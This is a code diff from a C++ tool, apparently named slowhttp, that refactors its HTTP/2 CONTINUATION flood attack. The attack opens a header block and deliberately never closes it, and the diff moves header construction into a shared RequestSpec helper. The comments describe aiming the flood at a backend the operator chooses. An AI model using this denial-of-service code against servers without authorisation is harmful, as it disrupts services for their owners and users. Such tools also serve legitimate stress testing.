@@ -5,6 +5,7 @@
 #include <algorithm>
 
 #include "slowhttp/http2.hpp"
+#include "slowhttp/request.hpp"
 
 namespace slowhttp {
 
@@ -35,18 +36,13 @@ std::string ContinuationFlood::opening() const {
   http2::write_frame(out, http2::FrameType::Settings, http2::kFlagNone, 0,
                      http2::settings_payload({{http2::kSettingsEnablePush, 0}}));
 
-  std::string block;
-  http2::hpack_literal(block, ":method", cfg_.effective_verb());
-  http2::hpack_literal(block, ":scheme", cfg_.target.tls() ? "https" : "http");
-  http2::hpack_literal(block, ":authority", cfg_.target.host_header());
-  http2::hpack_literal(block, ":path", cfg_.target.path);
-  http2::hpack_literal(block, "user-agent", cfg_.user_agent);
-  // Carried here too, even though this block is never completed. A server that
-  // routes or authenticates on headers reads them as the block arrives, and
-  // which backend absorbs the flood is exactly what the operator chose with
-  // -1/-j. Without them the flood lands somewhere they did not name.
-  for (const auto& h : cfg_.caller_headers_h2())
-    http2::hpack_literal(block, h.first, h.second);
+  // Same request as every other attack. What makes this one the CONTINUATION
+  // flood is below: the header block is opened and never closed.
+  //
+  // The caller's headers are carried even though the block never completes,
+  // because a server that routes or authenticates on headers reads them as they
+  // arrive -- they decide which backend absorbs the flood.
+  std::string block = RequestSpec::from(cfg_).serialize_http2();
 
   // Deliberately no END_HEADERS, and deliberately no END_STREAM. The block is
   // left open; everything after this is a CONTINUATION that also declines to
